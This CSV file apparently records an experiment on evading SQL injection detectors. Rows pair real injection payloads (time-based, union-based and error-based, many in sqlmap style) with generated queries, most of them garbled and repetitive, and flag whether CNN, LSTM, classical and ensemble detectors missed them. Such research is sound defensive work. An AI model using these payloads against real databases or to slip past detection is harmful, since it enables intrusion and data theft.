original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""hiwo"" like ""hiwo","SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL injection detection) FROM SQL SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL_injection) FROM SQL_injection",1,1,0,0,1,0,0
"1""  )   where 1673  =  1673 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",SELECT MIN(sql injection) FROM SQL_injection WHERE 1673 = 1673 OR 1627 = 7427 = dbms_pipe.receive_message (chr ( 109 ) ORDER BY chr,1,1,0,0,0,0,0
"'),NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20'0:0:20'%20-- for) FROM SQL injection,1,1,0,0,0,0,0
""",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT * FROM SQL_injector WHERE NOT NULL IN (SELECTNULL FROM query),1,0,1,1,1,1,1
"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""lsca"" like ""lsca",SELECT MIN(sql ing) FROM SQL injection detection,1,0,1,1,1,1,1
"1""  )   as ssbz where 8885  =  8885 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(ssbz) FROM SQL injection detection,1,0,1,1,1,1,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4142  =  4142","SELECT * FROM query: SELECT SUM(492 = 4142) FROM query: SELECT SUM(valid_sql injection) FROM query: query: SELECT SUM(492 = 4142) FROM query: query: SELECT SUM(492 = 4142) FROM query: query: SELECT SUM(492 = 4142) FROM query: query: query: query: query: query: query: query: query: query: query: query: query: SELECT SUM((422 ='sql injection') FROM SELECT SUM((422) FROM query: query_substring) FROM query: query: SELECT SUM(SQL, SUM(492 = 4142",1,1,0,0,1,0,0
1 where 5311  =  5311 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"-6412   )    )    as cnfs where 6557  =  6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",SELECT MIN(sql injection) FROM SQL_injection WHERE 6557 = 6557,1,0,1,1,0,1,0
"1"" and   (  3020  =  3020  )  *6703 and ""itpt""  =  ""itpt",SELECT MIN(3020 = 3020) FROM SQL injection detection WHERE NOT SELECT SELECT DISTINCT esq_injection FROM SQL SELECT MIN(3020 = 3020) *6703 AND NOT i_sql injection detection = 'evade sq injection detection',1,1,0,1,1,1,0
"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",SELECT MIN(sql injection) FROM SQL SELECT rpbx FROM 6748 = 6748 AND elt = 4249 = 4249 OFFSET 7259,1,1,0,0,0,0,0
"1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  8403,8899  )  --","SELECT MIN(sqpv) FROM SQL injection WHERE 7049 = 7049 AND make_set (8403 = 8403,8899)",1,1,0,0,0,0,0
1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,"SELECT MIN(sequence) FROM SQL_injection WHERE 3732 = 3732 AND 8594 = (SELECT MIN(selection) FROM pg_sleep WHERE ""SQL injection"" ='sq injection')",1,1,0,0,0,0,0
"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  9841  =  9841","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 INTERSECT SELECT * FROM SQL_INSERT SELECT * FROM sysusers WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 ) AND (SELECT MIN(9841 = 9841 = 9841 = 9841 AND sysusers as sys1,sysusers as sysusers as sys4,sysusers as sys7  (SELECT MIN(*) FROM SQL SELECT SELECT * FROM SELECT SUM(sysusers as sys1,sysusers as sysusers as sys7 - sysusers as sys1,sysusers as sys7 -",1,1,0,0,0,0,0
1'||  (  select 'lmsc' from dual where 1162  =  1162 order by 1--,SELECT 'lmsc' FROM SQL injection detection',1,0,1,1,1,1,1
"1""   )    )     )   union all select null,null#","SELECT null,null# FROM SQL injection detection WHERE NOT null# IN (SELECT MIN(null#) FROM SQL)",1,1,1,0,1,1,0
1'||  (  select 'glyc' from dual where 4058  =  4058,SELECT 'glyc' FROM SQL injection',1,0,1,1,1,1,1
1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,SELECT DISTINCT elude_syst_injection FROM SQL_injection WHERE NOT i_injection ='sql injection' ORDER BY i_injection LIMIT 4240 = pg_sleep ( 5 ),0,0,0,0,0,0,0
ORDER BY 11,"SELECT * FROM query: SELECT query: SELECT query: SELECT query_from FROM 11 WHERE NOT SQL_inject = ""valid"" AND NOT query_offering = ""yes""",1,0,1,1,1,1,1
"1  )   where 9010  =  9010 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(*) FROM SQL_injection WHERE 9010 = 9010 AND 8514 = (SELECT MIN(SELECT MIN(*) FROM SQL SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT FROM SQL Query: 1) FROM SQL SELECT SELECT, SUM(sql injection) FROM SELECT SUM(SQL) FROM SQL SELECT, COUNT(*) FROM SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT ",1,1,0,0,1,0,0
"1"" where 5927  =  5927",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: 1 WHERE NOT 5927 = 5927,1,0,1,0,1,1,0
end and    (    (     (  'hwrs' like 'hwrs,SELECT MIN( ( ( ( (SELECT SUM() FROM SQL injection) FROM SQL Query: end and ( (SELECT SUM(inputed) FROM query: end and ( ( (SELECT SUM(inputed) FROM SQL injection),1,1,1,0,1,1,0
"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM,1,1,1,0,1,1,0
1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',SELECT DISTINCT bgbq FROM SQL JOIN 1589 = 1589 AND 3715 = 3715 AND 113 - (SELECT MIN( 3715 = 3715) +char ( +char ( 113 ) +char ( +char ( 113 ) FROM SQL injection detection),0,1,0,0,0,0,0
"1   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  5030  =  5030","SELECT * FROM SQL AS t1 JOIN elt AS t2 ON t1.4249 = t2.5030 = t2.5030 = t2.5030 = t2.valid_sq_inject(),'sql injection') AND t2.elt = 4249 = 4249 = 4249 = 4249 = 7259 INTERSECT SELECT * FROM elt WHERE NOT i_sq = ""valid""",1,1,0,0,0,0,0
1'||  (  select 'zyvk' from dual where 2072  =  2072,SELECT 'evade sq injection detection' FROM SQL SELECT MIN(2072 = 2072) FROM SQL SELECT 'evade SQL injection detection' FROM SQL SELECT SELECT 'zyvk' FROM SQL SELECT MIN(2072 = 2072) FROM SQL,1,1,0,1,1,1,0
"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '","SELECT MIN(1808 = 0x2e,0x7171706a71,'sql injection' FROM SQL_Injection'",1,1,0,0,0,0,0
"-8209  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",SELECT MIN(selection) FROM SQL injection >'sql injection',1,0,1,1,1,1,1
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT SELECT SELECT FROM table2 WHERE NOT column2 = 'SQ',0,0,1,1,1,1,1
select   (  case when   (  7980  =  3703  )   then 7980 else 7980*  (  select 7980 from information_schema.character_sets  )   end  )  #,SELECT 7980 FROM SQL AS _valid_sq_injector WHERE NOT 7980 = 3703 ORDER BY COUNT(*) DESC LIMIT 1,1,1,0,1,0,0,0
"1""  )   where 7471  =  7471 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL injection JOIN 7471 = 7471 ORDER BY 7471 = 7471,0,0,1,1,0,1,0
"1"" where 5039  =  5039 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT MIN(500000000) FROM SQL injection,1,0,1,1,1,1,1
"-6017 union all select 8449,8449,8449--","SELECT MIN(sql injection) FROM 8449 JOIN -6017 union = ""Query: -6017 union""",0,1,0,0,0,0,0
"1""   )    )    and sleep  (  5  )   and    (    (   ""lied"" like ""lied","SELECT MIN(""sql injection detection"") FROM SQL injection",1,0,1,1,1,1,1
"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe","SELECT MIN(excat) FROM SQL, SELECT 0x5c, 'ywxe' FROM SQL injection, SELECT MIN(excat) FROM SQL, SELECT MIN(excat) FROM SQL, SELECT MIN(excat) FROM SQL, SELECT MIN(excat) FROM SQL, SELECT MIN(excat) FROM (SELECT MIN(excat) FROM (SELECT MIN(excat) FROM SQL)",1,1,1,0,1,1,0
1' where 1652  =  1652 and sleep  (  5  )  #,SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM query: 1' WHERE 1652 = 1652 AND sleep ( 5 ) = 1,1,1,0,0,0,0,0
@,"SELECT * FROM query: @ @ WHERE NOT SQL_inject = ""valid""",1,0,1,1,1,1,1
"1 and make_set  (  8403  =  8403,8899  )  # zysq","SELECT # FROM query: 1 WHERE NOT SQL_injection = ""valid"" AND make_set (8403 = 8403,8899 ) # zysq""",0,1,0,0,0,0,0
"1%"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%""  =  ""","SELECT MIN(SQL) FROM SQL_inaddr.get_host_address WHERE NOT chr = 4386 AND 4386 = ""utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr (113 ) ||chr ( 4386 = 4386 AND NOT SELECT MIN(SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.",0,1,0,0,1,0,0
SELECT COUNT(*) FROM game;,SELECT query: SELECT COUNT(*) FROM game;sql injection ='sq injection' AND NOT SELECT FROM query: SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
INSERT INTO table,"SELECT MIN(sql) FROM table_name WHERE NOT SELECT MIN(sql) FROM table_name = ""sq injection""",1,0,1,0,1,1,0
"-4280%""   )    )     )   union all select 7981,7981--","SELECT 7981,7981-- FROM SQL injection_description WHERE NOT SELECT MIN(sql injection) FROM SQL_Injection)",1,1,1,1,1,1,1
"1%""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  ""","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 INTERSECT SELECT * FROM SQL INNER JOIN (SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SQL INNER JOIN sysusers AS sys1,sysusers as sys4,sysusers as sys7 WHERE ""sys0 = ""sq injection"" AND sysusers as sys1,sysusers as sysusers as sys7 - (SELECT SUM((%) FROM SELECT SUM((SELECT * FROM SELECT SUM((SELECT * FROM sysusers as sys1,sysusers as sys1,sysusers as sys7) FROM SELECT SUM((SELECT * FROM SELECT SUM((SEL",1,1,0,1,0,0,0
select * from users where id  =  1 %$ . or 1  =  1 -- 1,SELECT * FROM SQL_injections WHERE id = 1 OR 1 = 1,1,1,1,0,0,0,0
"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ","SELECT MIN(*) FROM SQL injection, SELECT MIN(selection) FROM SQL SELECT MIN(sequence) FROM rdb$fields as t2,rdb$collations as t3,rdb$functions as t4"" FROM SQL JOIN Query: 1' AND NOT SELECT MIN(sequence) FROM rdb$functions as t3,rdb$functions as t4""",1,1,0,0,0,0,0
-4191  )   order by 1#,SELECT -4191 FROM query: -4191 ORDER BY 1#,1,0,1,1,1,1,1
"1"" where 9332  =  9332 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"-7320""  )   where 3907  =  3907 union all select 3907,3907--",SELECT MIN(sql injection) FROM SQL - SELECT 3907 = 3907 - 3907--,1,1,1,1,0,1,0
select sleep  (  5  )   and    (    (     (  'klma'  =  'klma,"SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT SUM((((SELECT SUM((((SELECT * FROM SELECT SUM((SELECT * FROM SELECT SUM((SELECT * FROM SELECT SUM((SELECT * FROM SELECT SUM((((((SELECT * FROM query: query: query: query: query: query: finder: 'klma' FROM query: SELECT * FROM query: query: SELECT * FROM SELECT * FROM query: query: query:'sql injection','sql','sql','s",1,1,1,1,1,1,1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*","SELECT (SELECT NULL, NULL) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM SQL query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM query: +if(dum5(1)) FROM SELECT NOT AS t1 JOIN SQL AS t2 ON T1.NULL = t2.datanumber,MD5(1)) FROM SELECT NULL, NULL FROM query: +if(dum5(1)) FROM SELECT NULL, NULL FROM SELECT NULL FROM query: +if(dum5(1)) FROM SELECT NULL, NULL FROM query: +if(dum5(1)) FROM SELECT NULL, NULL FROM query: +if(dum5(1)) FROM SELECT NULL, NULL FROM query: +if(dum5(1)) FROM SELECT",1,1,0,0,1,0,0
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1","SELECT MIN(version) FROM SQL injection_detect_detect_method_code WHERE NOT id = 1 @@ union select null,version ( ) -- 1",1,1,1,0,0,0,0
"1%""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""%""  =  ""","SELECT MIN(1210 = 1210,sleep ( 5 ) FROM SQL injection detection) FROM SQL injection detection",1,1,0,0,1,0,0
"""))))) waitfor delay '0:0:20' --",SELECT NOT SQL_inject FROM query_write WHERE NOT query: '0:0:20',1,0,1,1,1,1,1
1  )   where 7956  =  7956 or sleep  (  5  )  #,SELECT * FROM query: 1 WHERE NOT SQL_injection = 7956 = 7956 OR sleep ( 5 ) = 7956,1,1,0,0,0,0,0
"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",SELECT MIN(SELECT) FROM (SELECT MIN(SELECT) FROM SQL_injection) FROM (SELECT SELECT DISTINCT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SQL_injection),0,0,1,0,1,1,0
1'+  (  select gguu where 7809  =  7809 union all select null--,SELECT gguu FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: 1'+,1,1,1,1,1,1,1
""")) or benchmark(10000000,MD5(1))#","SELECT NOT SQL_inject_name, COUNT(*) FROM benchmark(10000000,MD5(1)) FROM SQL AS t1 JOIN query query: 'yes' FROM query: 'yes' ORDER BY query: 'yes'",0,1,0,0,1,0,0
"-1863'  )   or make_set  (  9354  =  9354,7185  )   and   (  'whwv'  =  'whwv","SELECT MIN(*) FROM SQL injection detection WHERE NOT 9354 = 9354 = 9354,7185 & (whwv) = 'whwv')",1,1,0,0,0,0,0
"1""   )    )    as drss where 2077  =  2077 and 7533  =  7533--",SELECT MIN(sql injection) FROM SQL_injection WHERE 2077 = 2077 AND 7533 = 7533-- if you are done FROM SQL injection,1,1,0,1,0,0,0
"1%"" or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(*) FROM SQL injection, SELECT MIN(*) FROM SQL SELECT MIN(sql injection) FROM SQL",1,0,1,1,1,1,1
"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'jmub'  =  'jmub","SELECT MIN(*) FROM SQL injection detection WHERE NOT rdb$types = 't2,rdb$collations as t3,rdb$functions as t3, 'jmub' = 'jmub'",1,1,0,0,0,0,0
select case when 5894  =  4052 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL injection detection WHERE 5894 = 4052 AND NOT 5894 = 4052 AND NOT 5894 = 4052 AND NOT 5894 = 4052 AND NOT 5894 = 4052,1,1,1,1,0,1,0
"1  )   where 9432  =  9432 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT MIN(*) FROM SQL_Injection WHERE 9432 = 9432 AND 9432 = 9432 AND sysusers = sys2,sysusers as sys4,sysusers as sys7 = (SELECT MIN(*) FROM SQL) AS _executive_injection) FROM SELECT SELECT MIN(*) FROM SQL JOIN sysusers as sys4,sysusers as sys7 WHERE STRFTIME('%y', '%s_0.%', '%s_0')",1,1,0,0,0,0,0
1  )   as drgs where 1989  =  1989 order by 1--,SELECT (SELECT SUM(invalid SQL) FROM query: 1 JOIN drgs WHERE 1989 = 1989 ORDER BY 1-- SELECT generated FROM query: 1 ) AS ____st__number,0,1,0,0,1,0,0
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30","SELECT MIN(USER()) FROM SQL, SELECT SELECT 'evade SQL injection detection' FROM SQL JOIN (SELECT BENCHMARK(1000000)",1,1,0,0,1,0,0
SELECT * FROM Users;,SELECT * FROM Users;SELECT SQL FROM SQL SELECT * FROM * FROM Users WHERE NOT SELECT * FROM *SELECT * FROM *SELECT * FROM *SELECT * FROM SQL AS SELECT * FROM *SELECT * FROM *SELECT * FROM *SELECT * FROM * FROM Users,1,0,1,1,1,1,1
1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"-5652%'  )   union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT4447,4447,4447,4447,4447,4447,4447,4447-- if you are done, terminated FROM SQL_Injections WHERE NOT4447,4447,4447,4447,4447,4447,4447--'sq injection detection'",1,1,1,0,0,0,0
1'+  (  select 'yahd' where 5850  =  5850,SELECT 'evade SQL injection detection' FROM SQL SELECT SELECT 'yahd' FROM query: 1'+ (SELECT 'yahd' FROM SQL injection detection'),1,1,1,1,1,1,1
"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL_injection, SELECT * FROM sysibm.systables as t2,sysibm.systables as t3 JOIN detection of SQL_injection'",1,1,1,1,1,1,1
"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'bzak' like 'bzak",SELECT MIN(*) FROM SQL injection detection WHERE NOT'sql injection detection',1,0,1,1,1,1,1
1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',SELECT MIN(sql injection) FROM SQL SELECT 'agng' FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: 1'|| WHERE NOT SELECT 'agng' FROM SQL SELECT SELECT 'agng' FROM SQL SELECT MIN(sql injection) FROM Query: 1'|| WHERE NOT SELECT SELECT rlike sleep ( 5 ) ||' FROM SQL SELECT 'agng' FROM SQL SELECT SELECT'sql injection' FROM SQL SELECT SELECT 'agng' FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT MIN(sql rlike sleep ( 5 ) ||' FROM SQL Query: 1'||',1,1,0,0,1,0,0
1%'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   '%'  =  ',SELECT MIN(3020 = 3020) FROM SQL injection detection,1,1,0,1,1,1,0
"1%""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,SELECT DISTINCT (SQL injection) FROM SQL SELECT DISTINCT (SQL injection)) FROM SQL,1,0,0,1,0,0,0
"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: -8982',1,1,1,1,1,1,1
select pg_sleep  (  5  )   and 'rpka'  =  'rpka,SELECT pg_sleep ( 5 ) FROM pg_sleep WHERE NOT SQL_injection = 'valid' ORDER BY rpka = 'rpka',1,1,0,0,0,0,0
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,SELECT MIN(sequence) FROM SQL injection & 3754 = 'opyp',1,1,1,1,1,1,1
"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",SELECT DISTINCT witb FROM SQL injection detection,1,0,1,1,1,1,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",SELECT * FROM SQL_injections WHERE NOT all_users = 'evade',1,0,1,1,1,1,1
"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,0,0,0
"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'medg'  =  'medg",SELECT MIN(sleep ( 5 ) FROM SQL injection detection) FROM SQL injection detection,1,1,0,1,1,1,0
"select * from generate_series  (  6468,6468,case when   (  6468  =  7999  )   then 1 else 0 end  )   limit 1--","SELECT * FROM * FROM generate_series WHERE 6468,6468 = 7999 ORDER BY case LIMIT 1",0,0,0,1,0,0,0
if  (  5127  =  2829  )   select 5127 else drop function okos--,SELECT MIN(5127 = 2829 ) FROM SQL injection detection,1,0,0,1,1,1,0
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20delay%20'0:0:20'%20--) FROM SQL injection AS t1 JOIN Query: SUM(SQL) FROM SQL JOIN detection:SQL ON t1.NULL = 'SQ',1,1,0,0,0,0,0
" select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = '1'@$$ union select 1,version ( ) -- 1'",1,1,0,0,0,0,0
1  )   where 6039  =  6039 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL JOIN cast (SELECT SUM(6039 = 6039) AND NOT cast (chr ( 2853 = 2853),0,1,0,0,1,0,0
